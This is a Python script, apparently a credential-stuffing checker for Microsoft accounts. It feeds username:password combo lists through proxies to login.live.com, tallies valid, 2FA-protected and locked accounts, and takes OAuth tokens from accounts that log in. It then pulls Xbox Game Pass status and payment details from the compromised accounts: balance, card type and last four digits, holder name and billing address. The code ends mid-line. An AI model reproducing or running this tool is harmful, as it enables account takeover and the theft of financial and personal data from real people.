import requests
import re
import json
from urllib.parse import unquote, quote
import threading
import queue
import sys
import os
import random
import time
from colorama import Fore, Style, init as colorama_init
from datetime import datetime

def solider(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def JsonKey(source_text, key, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        data = json.loads(source_text)
        if key in data:
            value = data[key]
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except json.JSONDecodeError:
        if create_empty:
            variables[var_name] = ""
        return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

soliderMax = 10
soliderTimeOut = 15
soliderMaxPer = 100

stats = {
    "hits": 0,
    "gamepass_hits": 0,
    "payment_hits": 0,
    "bad": 0,
    "retries": 0,
    "two_factor": 0,
    "custom_unknown": 0,
    "checked": 0,
    "total_combos": 0,
    "proxy_errors": 0
}
soliderStatusL = threading.Lock()
soliderOutput = threading.Lock()

soliderPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
soliderBK = "1665024852"
soliderUAID = "a5b22c26bc704002ac309462e8d061bb"

def soliderRetries(session, method, url, step_name, retries_counter_list, **kwargs):
    for attempt in range(soliderMaxPer + 1):
        try:
            response = session.request(method, url, timeout=soliderTimeOut, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError) as e:
            if retries_counter_list:
                retries_counter_list[0] += 1
            raise
        except requests.exceptions.RequestException as e:
            if attempt < soliderMaxPer:
                if retries_counter_list:
                    retries_counter_list[0] += 1
                time.sleep(1 + attempt)
                continue
            else:
                raise
    return None

def soliderChkAccount(user_pass_line, proxy_dict_for_session, check_mode):
    user, password = user_pass_line.split(':', 1)
    
    variables = {'USER': user, 'PASS': password}
    captures = {}
    current_status_internal = "UNKNOWN_INIT"
    account_retry_attempts = [0] 

    session = requests.Session()
    if proxy_dict_for_session:
        session.proxies = proxy_dict_for_session
    try:
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(variables['USER'])}&contextid=2CCDB02DC526CA71&bk={soliderBK}&uaid={soliderUAID}&pid=15216"
        
        payload_login_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
        payload_login = payload_login_template.replace("<USER>", variables['USER']) \
                                            .replace("<PASS>", variables['PASS']) \
                                            .replace("{ppft}", soliderPPFT)

        headers_login = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={soliderUAID}&display=touch&username={quote(variables['USER'])}",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
        }
        
        response_login = soliderRetries(session, 'POST', url_login, "Login", account_retry_attempts, headers=headers_login, data=payload_login, allow_redirects=True)
        if not response_login: return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
        response_text = response_login.text
        response_url = response_login.url

        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist. Enter a different account" in response_text or \
           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url and "oauth20_desktop.srf?" not in response_url):
            current_status_internal = "FAILURE_CREDENTIALS"
        elif ",AC:null,urlFedConvertRename" in response_text:
            current_status_internal = "BAN_LOCKED"
        elif "timed out" in response_text.lower():
            current_status_internal = "FAILURE_TIMEOUT_MSG"
        elif "account.live.com/recover" in response_text or \
             "account.live.com/identity/confirm" in response_text or \
             "Email/Confirm" in response_text:
            current_status_internal = "2FACTOR_VERIFICATION"
        elif "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
            current_status_internal = "CUSTOM_LOCK_ABUSE"
        else:
            success_cookie_found = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or \
                                "https://login.live.com/oauth20_desktop.srf?" in response_url
            
            if successful_redirect or success_cookie_found:
                current_status_internal = "SUCCESS_LOGIN_STEP"
            elif response_login.status_code == 200 and "https://login.live.com/ppsecure/post.srf" in response_url and not success_cookie_found:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN_STUCK_ON_POST"
            else:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
    
    if current_status_internal != "SUCCESS_LOGIN_STEP":
        if current_status_internal == "FAILURE_CREDENTIALS": return "BAD_CREDENTIALS", None, account_retry_attempts[0]
        if current_status_internal == "2FACTOR_VERIFICATION": return "2FA_REQUIRED", None, account_retry_attempts[0]
        if current_status_internal in ["BAN_LOCKED", "CUSTOM_LOCK_ABUSE"]: return "ACCOUNT_ISSUE", None, account_retry_attempts[0]
        return "LOGIN_FAILED_OTHER", None, account_retry_attempts[0]
    
    try:
        url_oauth_auth = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
        headers_oauth_auth = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://account.microsoft.com/"
        }
        response_oauth_auth = soliderRetries(session, 'GET', url_oauth_auth, "OAuth", account_retry_attempts, headers=headers_oauth_auth, allow_redirects=True)
        if not response_oauth_auth: return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]

        token_found_in_url = False
        if "access_token=" in response_oauth_auth.url:
            if solider(response_oauth_auth.url, "access_token=", "&token_type", "Token", variables):
                token_found_in_url = True
        
        if not token_found_in_url:
            return "TOKEN_ERROR_OAUTH_PARSE", None, account_retry_attempts[0]
        
        if variables.get("Token"):
            variables["Token_decoded"] = unquote(variables["Token"]) 
        else: 
            return "TOKEN_ERROR_OAUTH_MISSING", None, account_retry_attempts[0]
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]
    
    # Check for Game Pass
    has_game_pass = False
    game_pass_type = "false"
    game_pass_expired = "false"
    game_pass_expiry_date = "N/A"
    
    if check_mode == 1 or check_mode == 2:  # Both modes check Game Pass
        try:
            url_payment_transactions = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            headers_payment_transactions = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty", 
                "Sec-Fetch-Mode": "cors", 
                "Sec-Fetch-Site": "same-site",
            }
            response_payment_transactions = soliderRetries(session, 'GET', url_payment_transactions, "PaymentTransactions", account_retry_attempts, headers=headers_payment_transactions)
            if response_payment_transactions and response_payment_transactions.status_code == 200:
                transactions_data_text = response_payment_transactions.text
                solider(transactions_data_text, 'title":"', '",', "Item 1", variables) 
                solider(transactions_data_text, '"nextRenewalDate":"', 'T', "nextRenewalDate", variables)
                
                item1 = variables.get("Item 1", "").lower()
                if "xbox game pass" in item1 or "game pass" in item1:
                    has_game_pass = True
                    if "pc" in item1:
                        game_pass_type = "pcgamepass"
                    elif "ultimate" in item1:
                        game_pass_type = "ultimate"
                    elif "console" in item1:
                        game_pass_type = "console"
                    else:
                        game_pass_type = "true"
                    
                    # Get expiry date and check if expired
                    expiry_date_str = variables.get("nextRenewalDate", "")
                    if expiry_date_str:
                        try:
                            expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
                            game_pass_expiry_date = expiry_date.strftime("%d-%m-%Y")
                            current_date = datetime.now()
                            if expiry_date < current_date:
                                game_pass_expired = "true"
                            else:
                                game_pass_expired = "false"
                        except ValueError:
                            game_pass_expiry_date = expiry_date_str
        except:
            pass
    
    # Only do full capture if mode is 2
    if check_mode == 2:
        payment_api_response_status = "UNKNOWN_PAYMENT_API"
        try:
            if not variables.get("Token"):
                return "TOKEN_ERROR_MISSING_FOR_PAYMENT", None, account_retry_attempts[0]
            url_payment_instruments = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
            headers_payment_instruments = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty", 
                "Sec-Fetch-Mode": "cors", 
                "Sec-Fetch-Site": "same-site",
            }
            response_payment_instruments = soliderRetries(session, 'GET', url_payment_instruments, "PaymentInstruments", account_retry_attempts, headers=headers_payment_instruments)
            if response_payment_instruments and response_payment_instruments.status_code == 200:
                payment_data_text = response_payment_instruments.text
                solider(payment_data_text, 'balance":', ',"', "Balance", variables, prefix="$")
                solider(payment_data_text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"', "CardTypeLast4", variables)
                solider(payment_data_text, 'accountHolderName":"', '","', "AccountHolderName", variables)
                solider(payment_data_text, '"postal_code":"', '",', "Zipcode", variables)
                solider(payment_data_text, '"region":"', '",', "Region", variables)
                solider(payment_data_text, '"address_line1":"', '",', "Address1", variables)
                solider(payment_data_text, '"city":"', '",', "City", variables)
                captures["Address"] = f"[ Address: {variables.get('Address1', 'N/A')}, City: {variables.get('City', 'N/A')}, Stat
